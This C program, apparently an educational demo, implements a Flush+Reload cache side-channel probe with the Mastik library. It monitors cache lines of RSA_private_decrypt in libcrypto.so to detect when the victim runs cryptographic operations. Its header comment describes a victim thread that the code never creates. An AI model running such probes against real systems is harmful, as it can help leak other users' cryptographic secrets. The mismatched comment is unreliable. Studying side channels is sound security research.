/*
 * This piece of code is written by Shahzaib Kashif (github:@shahzaibk23)
 *
 * This code is an advanced implementation of the Flush+Reload attack
 * using the Mastik (https://github.com/0xADE1A1DE/Mastik) library, 
 * designed to simulate a real-world scenario. It demonstrates how 
 * to monitor multiple cache lines of a target function 
 * (e.g., RSA_private_decrypt in libcrypto.so) and analyze cache access 
 * times to infer victim activity, such as cryptographic operations.
 *
 * The code initializes the Flush+Reload structure, loads a shared
 * library, monitors multiple cache lines of a target function, and
 * uses a victim thread to simulate function calls. It performs
 * efficient tracing to collect access times only when activity is
 * detected, then analyzes the results to identify cache hits indicating
 * victim activity.
 *
 * The code includes error handling for library loading, monitoring,
 * thread creation, and memory allocation failures. It cleans up by
 * freeing resources, closing the shared library, and releasing the
 * Flush+Reload structure.
 *
 * Note: This code is for educational purposes only.
 */
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <dlfcn.h>
#include <unistd.h>
#include <mastik/fr.h>
#include <mastik/low.h>

#define MAX_SAMPLES     1000
#define SLOT_TIME       1000          // 1000 cycles for probing interval
#define MONITOR_LINES   4             // Monitor 4 cache lines
#define MAX_IDLE        50            // Max idle slots before stopping trace
#define CACHE_LINE_SIZE 64            // Standard cache line size

int main() {
    // Initialize Flush+Reload structure
    fr_t fr = fr_prepare();
    if (!fr) {
        fprintf(stderr, "Failed to initialize Flush+Reload structure\n");
        return 1;
    }

    // Load libcrypto.so
    void* handle = dlopen("libcrypto.so", RTLD_LAZY);
    if (!handle) {
        fprintf(stderr, "Failed to load libcrypto.so: %s\n", dlerror());
        fr_release(fr);
        return 1;
    }

    // Get address of RSA_private_decrypt (or use dummy function for testing)
    void* target_addr = dlsym(handle, "RSA_private_decrypt");
    if (target_addr) {
        printf("Monitoring RSA_private_decrypt at %p\n", target_addr);
    } else {
        fprintf(stderr, "Failed to find RSA_private_decrypt: %s\n", dlerror());
        dlclose(handle);
        fr_release(fr);
        return 1;
    }

    // Monitor multiple cache lines starting from target_addr
    for (int i = 0; i < MONITOR_LINES; i++) {
        void* addr = (void*)((char*)target_addr + i * CACHE_LINE_SIZE);
        if (!fr_monitor(fr, addr)) {
            printf("Failed to monitor address %p\n", addr);
            dlclose(handle);
            fr_release(fr);
            return 1;
        }
        printf("Monitoring address %p\n", addr);
    }

    // Determine cache hit/miss threshold
    int threshold = fr_probethreshold();
    printf("Cache hit/miss threshold: %d cycles\n", threshold);

    // Allocate buffer for results (MAX_SAMPLES * MONITOR_LINES)
    uint16_t* results = calloc(MAX_SAMPLES * MONITOR_LINES, sizeof(uint16_t));
    if (!results) {
        fprintf(stderr, "Failed to allocate results buffer\n");
        dlclose(handle);
        fr_release(fr);
        return 1;
    }

    // Perform Flush+Reload trace
    printf("Starting Flush+Reload trace...\n");
    int count = fr_trace(fr, MAX_SAMPLES, results, SLOT_TIME, threshold, MAX_IDLE);
    printf("Collected %d samples\n", count);

    // Analyze and print results
    for (int i = 0; i < count; i++) {
        printf("Sample %4d: ", i);
        int active = 0;
        for (int j = 0; j < MONITOR_LINES; j++) {
            uint16_t access_time = results[i * MONITOR_LINES + j];
            printf("%4u (%s) ", access_time, access_time < threshold ? "Hit" : "Miss");
            if (access_time < threshold) active = 1;
        }
        printf("| %s\n", active ? "Active" : "Idle");
    }

    // Cleanup
    free(results);
    dlclose(handle);
    fr_release(fr);
    return 0;
}